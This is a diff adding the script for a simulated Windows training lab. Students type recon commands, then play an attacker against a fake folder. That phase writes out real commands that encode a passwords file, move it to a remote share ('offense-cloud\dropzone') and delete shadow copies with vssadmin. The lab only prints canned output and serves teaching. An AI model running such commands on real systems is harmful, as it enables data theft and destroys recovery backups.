+    {name:'Q3_Budget_Report.xlsx',   type:'xlsx', size:'88 KB',  date:'7/28/2026 2:15 PM'},
+    {name:'VPN_Setup_Guide.pdf',     type:'pdf',  size:'204 KB', date:'5/3/2026 11:40 AM'}
+  ]},
+  pictures: { title:'Pictures', files:[
+    {name:'Office_Party.jpg',       type:'img', size:'3.1 MB', date:'12/19/2025 6:32 PM'},
+    {name:'Whiteboard_Diagram.png', type:'img', size:'860 KB', date:'6/11/2026 3:05 PM'},
+    {name:'ID_Badge_Photo.jpg',     type:'img', size:'1.4 MB', date:'1/2/2026 9:00 AM'}
+  ]},
+  downloads: { title:'Downloads', files:[
+    {name:'TeamViewer_Setup.exe',       type:'exe', size:'2.8 MB',  date:'8/30/2026 1:18 PM'},
+    {name:'Wireshark-4.2.5-x64.exe',    type:'exe', size:'54.2 MB', date:'8/31/2026 9:47 AM'},
+    {name:'Invoice_0932.pdf',           type:'pdf', size:'112 KB',  date:'9/1/2026 4:20 PM'}
+  ]},
+  businessplan: { title:'Business Plan', files:[
+    {name:'Business_Plan_2026.docx',    type:'docx', size:'340 KB', date:'4/14/2026 10:05 AM'},
+    {name:'Financial_Projections.xlsx', type:'xlsx', size:'126 KB', date:'4/15/2026 5:52 PM'},
+    {name:'Investor_Pitch.pptx',        type:'pptx', size:'4.6 MB', date:'4/16/2026 8:29 AM'}
+  ]}
+};
+
+/* ---------------- PHASE 2: SIMULATED OFFENSE ON "MY FILES" ----------------
+   Real Windows / built-in commands, mapped loosely to MITRE ATT&CK for
+   context. Everything here runs only inside the fake terminal above —
+   no real file, network, or system is ever touched. */
+const OFFENSE_CMDS = [
+  {
+    command:'dir "Desktop\\My Files"',
+    output:
+` Volume in drive C has no label.
+ Directory of C:\\Users\\Student\\Desktop\\My Files
+
+09/03/2026  09:12 AM             2,048 Passwords_Backup.txt
+02/02/2026  04:47 PM            49,152 Resume_JohnDoe.docx
+11/30/2025  08:03 AM             6,144 Old_Notes.txt
+               3 File(s)         57,344 bytes`,
+    title:'Look inside the folder',
+    whatItDoes:'This shows every file inside the <b>My Files</b> folder.',
+    effect:'compromise-myfiles'
+  },
+  {
+    command:'cd "Desktop\\My Files"',
+    output:'',
+    title:'Step into the folder',
+    whatItDoes:'This moves you inside the <b>My Files</b> folder, so the next commands work on it directly.',
+    effect:'open-myfiles'
+  },
+  {
+    command:'dir /a',
+    output:
+` Directory of C:\\Users\\Student\\Desktop\\My Files
+
+09/03/2026  09:12 AM             2,048 Passwords_Backup.txt
+02/02/2026  04:47 PM            49,152 Resume_JohnDoe.docx
+11/30/2025  08:03 AM             6,144 Old_Notes.txt
+09/01/2026  07:40 AM               512 ~cache.tmp          [Hidden]
+               4 File(s)         57,856 bytes`,
+    title:'Look for hidden files',
+    whatItDoes:'This also shows files that are normally hidden from view.'
+  },
+  {
+    command:'attrib -h -r -s Passwords_Backup.txt',
+    output:'',
+    title:'Unlock the file',
+    whatItDoes:'This removes the file\'s hidden, read-only, and protected settings so it can be changed.'
+  },
+  {
+    command:'ren Passwords_Backup.txt Passwords_Backup.dat',
+    output:'',
+    title:'Rename the file',
+    whatItDoes:'This changes the file\'s name and extension, so it looks different.'
+  },
+  {
+    command:'certutil -encode Passwords_Backup.dat Passwords_Backup.enc',
+    output:
+`Input Length = 2048
+Output Length = 2840
+CertUtil: -encode command completed successfully.`,
+    title:'Scramble the file',
+    whatItDoes:'This turns the file into a jumbled version that\'s harder to read. It can still be un-scrambled easily — it is not the same as strong, real encryption.'
+  },
+  {
+    command:'del Passwords_Backup.dat',
+    output:'',
+    title:'Delete the old copy',
+    whatItDoes:'This removes the readable copy, so only the scrambled version is left.'
+  },
+  {
+    command:'net use Z: \\\\offense-cloud\\dropzone',
+    output:'The command completed successfully.',
+    title:'Connect to an outside drive',
+    whatItDoes:'This connects your computer to a remote storage location, shown here as drive <b>Z</b>.'
+  },
+  {
+    command:'move Passwords_Backup.enc Z:\\',
+    output:'        1 file(s) moved.',
+    title:'Send the file out',
+    whatItDoes:'This moves the scrambled file from this computer onto the outside drive.'
+  },
+  {
+    command:'vssadmin delete shadows /all /quiet',
+    output:
+`vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Microsoft Corporation. All rights reserved.
+
+Successfully deleted 3 shadow copies.`,
+    title:'Delete the backup copies',
+    whatItDoes:'This removes Windows\' built-in backup snapshots, so the file can\'t easily be restored.'
+  }
+];
+
+/* ---------------- PINNED APPS ---------------- */
+const APPS = [
+  {name:'Microsoft Edge', icon:ICO.edge, keywords:['edge','browser']},
+  {name:'File Explorer', icon:ICO.explorer, keywords:['explorer','files']},
+  {name:'Settings', icon:ICO.settings, keywords:['settings']},
+  {name:'Calculator', icon:ICO.calc, keywords:['calc','calculator']},
+  {name:'Mail', icon:ICO.mail, keywords:['mail','outlook']},
+  {name:'Photos', icon:ICO.photos, keywords:['photos','pictures']},
+  {name:'Microsoft Store', icon:ICO.store, keywords:['store']},
+  {name:'Windows PowerShell', icon:ICO.powershell, keywords:['powershell','ps'], isPS:true},
+  {name:'Command Prompt', icon:ICO.cmd, keywords:['cmd','command','command prompt','terminal','console'], isCmd:true}
+];
+
+/* ---------------- TERMINAL "COMMAND" STEPS ---------------- */
+const CMDS = [
+  {
+    command:'ipconfig /all',
+    output:
+`Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : STUDENT-PC01
+   Primary Dns Suffix  . . . . . . . :
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+
+Ethernet adapter Ethernet:
+
+   Description . . . . . . . . . . . : Intel(R) Ethernet Connection
+   Physical Address. . . . . . . . . : 00-1A-2B-3C-4D-5E
+   DHCP Enabled. . . . . . . . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 192.168.1.42(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.1.1`,
+    title:'Check your computer\'s address',
+    whatItDoes:'This shows your computer\'s IP address and the network it\'s connected to.'
+  },
+  {
+    command:'arp -a',
+    output:
+`Interface: 192.168.1.42 --- 0xb
+  Internet Address      Physical Address      Type
+  192.168.1.1           aa-bb-cc-00-11-22     dynamic
+  192.168.1.10          aa-bb-cc-00-11-45     dynamic
+  192.168.1.23          aa-bb-cc-00-11-9f     dynamic`,
+    title:'See other devices nearby',
+    whatItDoes:'This shows other computers that yours has recently talked to on the same network.'
+  },
+  {
+    command:'netstat -ano',
+    output:
+`Proto  Local Address        Foreign Address      State        PID
+TCP    192.168.1.42:49721   93.184.216.34:443    ESTABLISHED  4120
+TCP    192.168.1.42:139     0.0.0.0:0            LISTENING    4
+TCP    0.0.0.0:3389         0.0.0.0:0            LISTENING    892`,
+    title:'See open connections',
+    whatItDoes:'This shows what your computer is currently connected to, and which program is using each connection.'
+  },
+  {
+    command:'tasklist',
+    output:
+`Image Name              PID   Session Name   Mem Usage
+========================= ===== ============== ============
+System Idle Process        0    Services         8 K
+svchost.exe               892    Services      12,344 K
+explorer.exe             4356    Console       55,120 K`,
+    title:'See running programs',
+    whatItDoes:'This lists every program currently running on the computer, with its ID number.'
+  },
+  {
+    command:'nslookup megacorp.local',
+    output:
+`Server:  UnKnown
+Address:  192.168.1.1
+
+Name:    megacorp.local
+Address: 192.168.1.10`,
+    title:'Find a website\'s address',
+    whatItDoes:'This looks up the real address (IP) behind a name like megacorp.local.'
+  },
+  {
+    command:'netsh wlan show profiles',
+    output:
+`Profiles on interface Wi-Fi:
+
+Group policy profiles (read only)
+----------------------------------
+    (none)
+
+User profiles
+--------------
+    All User Profile     : HomeNetwork
+    All User Profile     : CoffeeShop-Guest`,
+    title:'See saved Wi-Fi networks',
+    whatItDoes:'This lists every Wi-Fi network this computer has connected to before.'
+  },
+  {
+    command:'whoami /priv',
+    output:
+`PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                       State
+============================= ================================= ========
+SeShutdownPrivilege           Shut down the system              Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking           Enabled
+SeUndockPrivilege             Remove computer from docking st.  Disabled`,
+    title:'Check your own permissions',
+    whatItDoes:'This shows what special powers your current user account has on this computer.'
+  }
+];
+
+/* ---------------- BUILD TUTORIAL STEP LIST ---------------- */
+const steps = [
+  {type:'click', target:'#start-button', instruction:'Click the <b>Start button</b> (the Windows logo) on the taskbar.'},
+  {type:'type', target:'#start-search', expected:'cmd', instruction:'Type <b>cmd</b> into the search box that just opened.'},
+  {type:'click', target:'#search-result-cmd', instruction:'Click <b>Command Prompt</b> in the search results to open it.'}
+];
+CMDS.forEach((c,i)=>{
+  steps.push({type:'command', command:c.command, output:c.output, title:c.title, whatItDoes:c.whatItDoes,
+    instruction:'Click inside the terminal, type the command below, then press <b>Enter</b>.'});
+});
+steps.push({
+  type:'info',
+  instruction:'Nice work! Now let\'s switch roles. Act like an attacker and go after the <b>My Files</b> folder, using the same terminal.'
+});
+OFFENSE_CMDS.forEach(c=>{
+  steps.push({type:'command', command:c.command, output:c.output, title:c.title, whatItDoes:c.whatItDoes, effect:c.effect,
+    instruction:'Click inside the terminal, type the command below, then press <b>Enter</b>.'});
+});
+steps.push({type:'end', instruction:'Module complete.'});
+
+let stepIndex = 0;
+let startMenuOpen = false;
+let cmdOpen = false;
+
+/* ---------------- DOM REFS ---------------- */
+const $ = s=>document.querySelector(s);
+const startMenu = $('#start-menu');
+const startBtn = $('#start-button');
+const searchInput = $('#start-search');
+const pinnedGrid = $('#pinned-grid');
+const searchResults = $('#search-results');
+const pinnedLabel = $('#pinned-label');
+const cmdWindow = $('#cmd-window');
+const cmdBody = $('#cmd-body');
+const cmdTaskBtn = $('#cmd-taskbtn');
+const tpInstruction = $('#tp-instruction');
+const tpFeedback = $('#tp-feedback');
+const tpContinue = $('#tp-continue');
+const tpStepCount = $('#tp-step-count');
+const tpProgressBar = $('#tp-progress-bar');
+const tpDoneBadge = $('#tp-done-badge');
+const tpRestart = $('#tp-restart');
+
+/* ---------------- RENDER PINNED APPS ---------------- */
+APPS.forEach(app=>{
+  const tile = document.createElement('div');
+  tile.className='app-tile';
+  tile.innerHTML = `${app.icon}<span>${app.name}</span>`;
+  tile.addEventListener('click', ()=> launchApp(app));
+  pinnedGrid.appendChild(tile);
+});
+
+/* ---------------- HIGHLIGHTING ---------------- */
+function clearHighlights(){
+  document.querySelectorAll('.tutorial-target').forEach(el=>el.classList.remove('tutorial-target'));
+}
+function highlight(selector){
+  clearHighlights();
+  if(!selector) return;
+  const el = document.querySelector(selector);
+  if(el) el.classList.add('tutorial-target');
+}
+
+/* ---------------- START MENU LOGIC ---------------- */
+function toggleStartMenu(force){
+  startMenuOpen = (force !== undefined) ? force : !startMenuOpen;
+  startMenu.classList.toggle('open', startMenuOpen);
+  startBtn.classList.toggle('active', startMenuOpen);
+  if(startMenuOpen){
+    searchInput.value='';
+    searchResults.style.display='none';
+    searchResults.innerHTML='';
+    pinnedGrid.style.display='grid';
+    pinnedLabel.style.display='block';
+    setTimeout(()=>searchInput.focus(),50);
+  }
+  refreshHighlightForCurrentStep();
+}
+startBtn.addEventListener('click', ()=>{
+  toggleStartMenu();
+  if(steps[stepIndex] && steps[stepIndex].type==='click' && steps[stepIndex].target==='#start-button' && startMenuOpen){
+    advance(350);
+  }
+});
+
+function renderSearchResults(query){
+  const q = query.trim().toLowerCase();
+  if(!q){
+    searchResults.style.display='none';
+    searchResults.innerHTML='';
+    pinnedGrid.style.display='grid';
+    pinnedLabel.style.display='block';
+    return;
+  }
+  pinnedGrid.style.display='none';
+  pinnedLabel.style.display='none';
+  const matches = APPS.filter(a => a.name.toLowerCase().includes(q) || a.keywords.some(k=>k.includes(q)));
+  searchResults.style.display='flex';
+  searchResults.innerHTML='';
+  if(matches.length){
+    const tag = document.createElement('div');
+    tag.className='best-match-tag';
+    tag.textContent='Best match';
+    searchResults.appendChild(tag);
+    matches.slice(0,5).forEach((app,idx)=>{
+      const row = document.createElement('div');
+      row.className='result-row';
+      if(app.isCmd) row.id='search-result-cmd';
+      row.innerHTML = `${app.icon}<div><div class="r-main">${app.name}</div><div class="r-sub">${idx===0?'App':'App'}</div></div>`;
+      row.addEventListener('click', ()=> launchApp(app));
+      searchResults.appendChild(row);
+    });
+  }
+  refreshHighlightForCurrentStep();
+}
+searchInput.addEventListener('input', e=>{
+  renderSearchResults(e.target.value);
+  const st = steps[stepIndex];
+  if(st && st.type==='type' && st.target==='#start-search'){
+    if(e.target.value.trim().toLowerCase()===st.expected){
+      advance(400);
+    }
+  }
+});
+
+function launchApp(app){
+  if(app.isCmd){
+    openCmd();
+    toggleStartMenu(false);
+  } else {
+    // decoy apps: just close the menu, no real window (out of scope for the lab)
+    toggleStartMenu(false);
+  }
+}
+
+/* ---------------- CMD WINDOW LOGIC ---------------- */
+let dragOffset=null;
+$('#cmd-titlebar').addEventListener('mousedown', e=>{
+  if(e.target.closest('.win-ctrl')) return;
+  const rect = cmdWindow.getBoundingClientRect();
+  dragOffset = {x:e.clientX-rect.left, y:e.clientY-rect.top};
+  document.addEventListener('mousemove', dragMove);
+  document.addEventListener('mouseup', ()=>document.removeEventListener('mousemove', dragMove), {once:true});
+});
+function dragMove(e){
+  if(!dragOffset) return;
+  cmdWindow.style.left = (e.clientX-dragOffset.x)+'px';
+  cmdWindow.style.margin='0';
+  cmdWindow.style.top = (e.clientY-dragOffset.y)+'px';
+}
+$('#cmd-close').addEventListener('click', ()=>{
+  cmdWindow.classList.remove('show');
+  cmdOpen=false;
+  cmdTaskBtn.style.display='none';
+});
+cmdTaskBtn.addEventListener('click', ()=>{
+  cmdWindow.classList.toggle('show');
+});
+
+function openCmd(){
+  cmdOpen = true;
+  cmdWindow.classList.add('show');
+  cmdTaskBtn.style.display='flex';
+  if(!cmdBody.dataset.inited){
+    cmdBody.dataset.inited='1';
+    addOutputLine('Microsoft Windows [Version 10.0.22631.4460]');
+    addOutputLine('(c) Microsoft Corporation. All rights reserved.');
+    addOutputLine('');
+    newPromptLine();
+  }
+  const st = steps[stepIndex];
+  if(st && st.type==='click' && st.target==='#search-result-cmd'){
+    advance(300);
+  }
+  refreshHighlightForCurrentStep();
+}
+
+function addOutputLine(text, cls){
+  const div = document.createElement('div');
+  div.className='line '+(cls||'out');
+  div.textContent = text;
+  cmdBody.appendChild(div);
+  cmdBody.scrollTop = cmdBody.scrollHeight;
+}
+
+let activeInput=null;
+let currentPromptPath = 'C:\\Users\\Student';
+function newPromptLine(){
+  const row = document.createElement('div');
+  row.className='prompt-row';
+  row.innerHTML = `<span class="prompt-label">${currentPromptPath}&gt; </span>`;
+  const input = document.createElement('input');
+  input.id='cmd-input';
+  input.autocomplete='off';
+  input.spellcheck=false;
+  row.appendChild(input);
+  cmdBody.appendChild(row);
+  activeInput = input;
+  input.focus();
+  cmdBody.scrollTop = cmdBody.scrollHeight;
+  input.addEventListener('keydown', e=>{
+    if(e.key==='Enter'){
+      handleEnter(input.value);
+    }
+  });
+  cmdBody.addEventListener('click', ()=>{ if(activeInput) activeInput.focus(); });
+}
+
+function handleEnter(raw){
+  const typed = raw.trim();
+  activeInput.disabled = true;
+  // echo what was typed as plain text on its own frozen row
+  const frozen = document.createElement('div');
+  frozen.className='line cmd-echo';
+  frozen.textContent = currentPromptPath + '> ' + typed;
+  activeInput.closest('.prompt-row').replaceWith(frozen);
+
+  const st = steps[stepIndex];
+  if(st && st.type==='command'){
+    if(typed.toLowerCase() === st.command.toLowerCase()){
+      if(st.output && st.output.length) addOutputLine(st.output);
+      addOutputLine('');
+      newPromptLine();
+      if(st.effect) applyEffect(st.effect);
+      advance(500);
+    } else if(typed===''){
+      newPromptLine();
+    } else {
+      addOutputLine(`'${typed.split(' ')[0]}' is not recognized, or that isn't the command this step is asking for.`, 'err');
+      addOutputLine('Try typing exactly: '+st.command, 'err');
+      addOutputLine('');
+      newPromptLine();
+    }
+  } else {
+    // no active command step (e.g. tutorial finished) - just behave like a normal echo
+    addOutputLine('');
+    newPromptLine();
+  }
+}
+
+/* ---------------- TUTORIAL ENGINE ---------------- */
+function refreshHighlightForCurrentStep(){
+  const st = steps[stepIndex];
+  if(!st){ clearHighlights(); return; }
+  if(st.type==='click'){
+    const el = document.querySelector(st.target);
+    if(el && isVisible(el)) highlight(st.target); else clearHighlights();
+  } else if(st.type==='type'){
+    if(startMenuOpen) highlight(st.target); else clearHighlights();
+  } else if(st.type==='command'){
+    if(cmdOpen) highlight('#cmd-body'); else clearHighlights();
+  } else {
+    clearHighlights();
+  }
+}
+function isVisible(el){
+  const r = el.getBoundingClientRect();
+  return r.width>0 && r.height>0;
+}
+
+function renderTutorial(){
+  const st = steps[stepIndex];
+  tpFeedback.style.display='none';
+  tpFeedback.className='';
+  tpContinue.style.display='none';
+  tpDoneBadge.style.display='none';
+  tpRestart.style.display='none';
+
+  const totalMain = steps.length-1;
+  tpStepCount.textContent = `Step ${Math.min(stepIndex+1,totalMain)} of ${totalMain}`;
+  tpProgressBar.style.width = Math.min(100,(stepIndex/totalMain)*100)+'%';
+
+  if(st.type==='end'){
+    tpInstruction.innerHTML = `<b>Great work — lab complete!</b><br><br>First, you looked around a computer and its network (recon).<br><br>Then, you acted like an attacker: you found a folder, changed and scrambled a file, sent it to an outside drive, and deleted the backup copies.<br><br>Only ever try commands like these on a computer or network you own, or have clear permission to test.`;
+    tpProgressBar.style.width='100%';
+    tpDoneBadge.style.display='block';
+    tpRestart.style.display='block';
+    clearHighlights();
+    return;
+  }
+
+  if(st.type==='info'){
+    tpInstruction.innerHTML = st.instruction;
+    tpContinue.style.display='block';
+    clearHighlights();
+    return;
+  }
+
+  tpInstruction.innerHTML = '';
+  if(st.type==='command'){
+    const titleEl = document.createElement('div');
+    titleEl.innerHTML = `<b>${st.title}</b>`;
+    titleEl.style.marginBottom = '6px';
+    tpInstruction.appendChild(titleEl);
+
+    const whatEl = document.createElement('div');
+    whatEl.className = 'cmd-whatitdoes';
+    whatEl.innerHTML = st.whatItDoes;
+    tpInstruction.appendChild(whatEl);
+
+    const instrEl = document.createElement('div');
+    instrEl.style.margin = '10px 0 2px';
+    instrEl.innerHTML = st.instruction;
+    tpInstruction.appendChild(instrEl);
+
+    const chip = document.createElement('div');
+    chip.className='cmd-chip';
+    chip.textContent = st.command;
+    tpInstruction.appendChild(chip);
+  } else {
+    tpInstruction.innerHTML = st.instruction;
+  }
+  refreshHighlightForCurrentStep();
+}
+
+function showCommandFeedback(st){
+  tpFeedback.style.display='block';
+  tpFeedback.className='';
+  tpFeedback.innerHTML = st.whatItDoes;
+  clearHighlights();
+}
+
+tpContinue.addEventListener('click', ()=> advance(0));
+tpRestart.addEventListener('click', ()=> location.reload());
+
+function advance(delay){
+  setTimeout(()=>{
+    stepIndex++;
+    if(stepIndex>=steps.length) stepIndex = steps.length-1;
+    renderTutorial();
+  }, delay||0);
+}
+
+/* ---------------- CLOCK ---------------- */
+function tickClock(){
+  const now = new Date();
+  const hh = String(now.getHours()%12===0?12:now.getHours()%12).padStart(2,'0');
+  const mm = String(now.getMinutes()).padStart(2,'0');
+  const ampm = now.getHours()>=12?'PM':'AM';
+  $('#clock-time').textContent = `${hh}:${mm} ${ampm}`;
+  $('#clock-date').textContent = `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()}`;
+}
+tickClock();
+setInterval(tickClock, 1000);
+
+/* ---------------- CLOSE START MENU ON OUTSIDE CLICK ---------------- */
+document.addEventListener('click', e=>{
+  if(startMenuOpen && !startMenu.contains(e.target) && e.target!==startBtn && !startBtn.contains(e.target)){
+    // don't force-close mid guided step if it would strand the student
+    const st = steps[stepIndex];
+    if(!(st && (st.type==='type'||st.type==='click') && st.target && (st.target==='#start-search'||st.target==='#search-result-cmd'))){
+      toggleStartMenu(false);
+    }
+  }
+});
+
+/* ---------------- OFFENSE-PHASE SIDE EFFECTS ---------------- */
+function applyEffect(effect){
+  if(effect==='compromise-myfiles'){
+    const el = document.querySelector('.d-icon[data-folder="myfiles"]');
+    if(el) el.classList.add('folder-compromised');
+    showToast('Access gained — "My Files" flagged as compromised.');
+  } else if(effect==='open-myfiles'){
+    openExplorer('myfiles');
+    currentPromptPath = 'C:\\Users\\Student\\Desktop\\My Files';
+  }
+}
+
+/* ---------------- TOAST ---------------- */
+let toastTimer=null;
+function showToast(msg){
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(()=>t.classList.remove('show'), 2200);
+}
+
+/* ---------------- FILE EXPLORER WINDOW ---------------- */
+const explorerWindow = document.getElementById('explorer-window');
+const explorerTitle = document.getElementById('explorer-title');
+const explorerBreadcrumb = document.getElementById('explorer-breadcrumb');
+const explorerList = document.getElementById('explorer-list');
+
+function openExplorer(folderKey){
+  const data = FOLDERS[folderKey];
+  if(!data) return;
+  explorerTitle.textContent = data.title;
+  explorerBreadcrumb.textContent = `This PC > Desktop > ${data.title}`;
+  explorerList.innerHTML = '';
+  data.files.forEach(f=>{
+    const row = document.createElement('div');
+    row.className = 'ex-file-row';
+    row.innerHTML = `
+      <div class="fname">${FILE_ICONS[f.type]}<span class="fn-text">${f.name}</span></div>
+      <div class="fdate">${f.date}</div>
+      <div class="fsize">${FILE_KIND_LABEL[f.type]}</div>
+      <div class="fsize">${f.size}</div>`;
+    row.addEventListener('click', e=>{
+      e.stopPropagation();
+      explorerList.querySelectorAll('.ex-file-row').forEach(r=>r.classList.remove('selected'));
+      row.classList.add('selected');
+    });
+    row.addEventListener('dblclick', e=>{
+      e.stopPropagation();
+      showToast('Simulated file — no real content behind it in this lab.');
+    });
+    explorerList.appendChild(row);
+  });
+  explorerWindow.classList.add('show');
+}
+document.getElementById('explorer-close').addEventListener('click', ()=>{
+  explorerWindow.classList.remove('show');
+});
+document.getElementById('explorer-content').addEventListener('click', ()=>{
+  explorerList.querySelectorAll('.ex-file-row').forEach(r=>r.classList.remove('selected'));
+});
+
+let explorerDragOffset=null;
+document.getElementById('explorer-titlebar').addEventListener('mousedown', e=>{
+  if(e.target.closest('.win-ctrl')) return;
+  const rect = explorerWindow.getBoundingClientRect();
+  explorerDragOffset = {x:e.clientX-rect.left, y:e.clientY-rect.top};
+  document.addEventListener('mousemove', explorerDragMove);
+  document.addEventListener('mouseup', ()=>document.removeEventListener('mousemove', explorerDragMove), {once:true});
+});
+function explorerDragMove(e){
+  if(!explorerDragOffset) return;
+  explorerWindow.style.left = (e.clientX-explorerDragOffset.x)+'px';
+  explorerWindow.style.margin='0';
+  explorerWindow.style.top = (e.clientY-explorerDragOffset.y)+'px';
+}
+
+document.querySelectorAll('.d-icon[data-folder]').forEach(icon=>{
+  icon.addEventListener('dblclick', ()=> openExplorer(icon.dataset.folder));
+});
+
+/* ---------------- DESKTOP ICON SELECTION ---------------- */
+document.querySelectorAll('.d-icon').forEach(icon=>{
+  icon.addEventListener('click', e=>{
+    e.stopPropagation();
+    document.querySelectorAll('.d-icon').forEach(i=>i.classList.remove('selected'));
+    icon.classList.add('selected');
+  });
+});
+document.getElementById('desktop').addEventListener('click', ()=>{
+  document.querySelectorAll('.d-icon').forEach(i=>i.classList.remove('selected'));
+});
+
+/* ---------------- START OVERLAY / FULLSCREEN ---------------- */
+const startOverlay = document.getElementById('start-overlay');
+const readyBtn = document.getElementById('ready-btn');
+
+async function enterFullscreenAndBegin(){
+  const el = document.documentElement;
+  try{
+    if(el.requestFullscreen){ await el.requestFullscreen(); }
+    else if(el.webkitRequestFullscreen){ await el.webkitRequestFullscreen(); }
+    else if(el.msRequestFullscreen){ await el.msRequestFullscreen(); }
+  }catch(err){
+    // Fullscreen may be blocked (e.g. inside a restricted iframe) — continue windowed.
+  }
+  startOverlay.style.display='none';
+  searchInput && searchInput.blur();
+}
+readyBtn.addEventListener('click', enterFullscreenAndBegin);
+
+/* ---------------- INIT ---------------- */
+renderTutorial();
+
+})();
+</script>
+</body>
+</html>
